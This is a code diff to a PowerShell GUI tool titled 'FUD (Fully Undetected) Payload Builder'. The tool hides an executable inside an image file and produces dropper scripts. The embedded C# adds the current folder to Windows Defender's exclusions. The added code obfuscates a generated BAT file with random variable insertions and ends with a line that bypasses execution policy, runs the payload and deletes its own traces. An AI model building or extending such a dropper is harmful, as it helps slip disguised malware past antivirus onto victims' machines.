@@ -7,13 +7,11 @@ using System.IO;
 using System.Linq;
 using System.Diagnostics;
 using System;
-
 public class Dropped
 {
     public static void Main()
     {
         string path_current = Directory.GetCurrentDirectory();
-
         Process pstest = new Process();
         pstest.StartInfo.FileName = "powershell.exe";
         pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
@@ -43,9 +41,8 @@ $inputXML = @'
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:GUI_TEST"
         mc:Ignorable="d"
-        Title="Fud Builder" Height="470" Width="818">
+        Title="Dropper Builder | K.Dot#4044" Height="470" Width="818">
     <Grid x:Name="Name_Thing">
-        <Button x:Name="START_BUTTON" Content="Start" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="291" FontFamily="Segoe UI Black" FontSize="36"/>
         <TextBox HorizontalAlignment="Left" Height="46" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="330" IsReadOnly="True"/>
         <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
         <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
@@ -53,21 +50,61 @@ $inputXML = @'
         <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,56,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
         <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,137,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
         <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="517,189,0,0" VerticalAlignment="Top" Width="62"/>
-        <Image HorizontalAlignment="Left" Height="174" Margin="618,18,0,0" VerticalAlignment="Top" Width="172" Source="/comethazine.png"/>
         <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62"/>
         <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62"/>
+        <Button x:Name="ps1_button" Content="Build PS1" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133"/>
+        <Button x:Name="Bat_Button" Content="Build BAT" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133"/>
+        <Image HorizontalAlignment="Left" Height="156" Margin="634,10,0,0" VerticalAlignment="Top" Width="156" Source="comethazine.png"/>
 
     </Grid>
 </Window>
+
 '@
 
+function New-random_string {
+    $length = Get-Random -Minimum 5 -Maximum 10
+    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    $result = ""
+    for ($i = 0; $i -lt $length; $i++) {
+        $rand = Get-Random -Maximum $chars.Length
+        $result += $chars[$rand]
+    }
+    return $result
+}
 
-
+function Invoke-obfuscate {
+    param(
+        [string]$line
+    )
+    $result = ""
+    $variable = $False
+    foreach($char in $line -split "") {
+        if ($char -eq "%") {
+            $variable = -not $variable
+        }
+        if ($variable) {
+            $result += $char
+        } else {
+            if ($char -eq "@") {
+                $result += "^@"
+            }
+            elseif ($char -eq "`"") {
+                $result += "^`""
+            }
+            else {
+                $ran_string = New-random_string
+                $result += "$char%$ran_string%"
+            }
+        }
+    }
+    return $result
+}
 
 function build {
     param(
         [string]$image,
-        [string]$exe
+        [string]$exe,
+        [string]$type
     )
     $working_dir = Get-Location
     $image_name = Split-Path $image -Leaf
@@ -80,9 +117,32 @@ function build {
     [System.IO.File]::WriteAllBytes("$working_dir\$image_name", $combined_bytes)
     $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
     $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\payload.ps1"
+    if ($type -eq "bat") {
+        $ps1_code = $EMBEDDED_CODE.Split("`n")
+        foreach ($line in $ps1_code) {
+            if ($line -eq "") {
+                continue
+            }
+            $line = "echo " + $line
+            $line = $line + " >> payload.ps1"
+            $line = Invoke-obfuscate $line
+            Add-Content -Path .\payload.bat -Value $line
+        }
+        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1 && del payload.bat"
+        $str_obf = Invoke-obfuscate $str_obf
+        Add-Content -Path .\payload.bat -Value $str_obf
+        $var_OUTPUT_BOX.Text += "Payload.bat created in $working_dir `n"
+        Remove-Item -Path .\payload.ps1 -Force
+    }
+    else {
+        $var_OUTPUT_BOX.Text += "Payload.ps1 created in $working_dir `n"
+    }
 }
 
-$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window'
+$image_name = "comethazine.png"
+$working_dir = Get-Location
+$image_name_path = "$working_dir\$image_name"
+$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path
 [XML]$XAML = $inputXML
 
 $reader = (New-Object System.Xml.XmlNodeReader $xaml)
@@ -94,7 +154,6 @@ try {
 }
 
 $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
-    #"trying item $($_.Name)"
     try {
         Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction Stop
     } catch {
@@ -124,16 +183,21 @@ $var_FIND_EXE.add_Click({
     }
 })
 
-$var_START_BUTTON.add_Click({
-    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text
-    $var_OUTPUT_BOX.Text = "Payload has been built!"
+$var_ps1_button.add_Click({
+    if ($var_IMAGE_PATH_SHOW.Text -eq '...' -or $var_EXE_PATH_SHOW.Text -eq '...') {
+        throw "Please select an image and exe"
+    }
+    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
+    $var_OUTPUT_BOX.Text += "PS1 Built`n"
 })
 
+$var_Bat_Button.add_Click({
+    if ($var_IMAGE_PATH_SHOW.Text -eq '...' -or $var_EXE_PATH_SHOW.Text -eq '...') {
+        throw "Please select an image and exe"
+    }
+    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
+    $var_OUTPUT_BOX.Text += "BAT Built`n"
+})
+
+Remove-Item -Path .\payload.ps1 -Force -ErrorAction SilentlyContinue
 $Null = $window.ShowDialog()
-
-
-#Write-Host "Where is the image path? " -ForegroundColor Yellow -NoNewline
-#$image = Read-Host
-#Write-Host "Where is the exe path? " -ForegroundColor Yellow -NoNewline
-#$exe = Read-Host
-#build -image $image -exe $exe
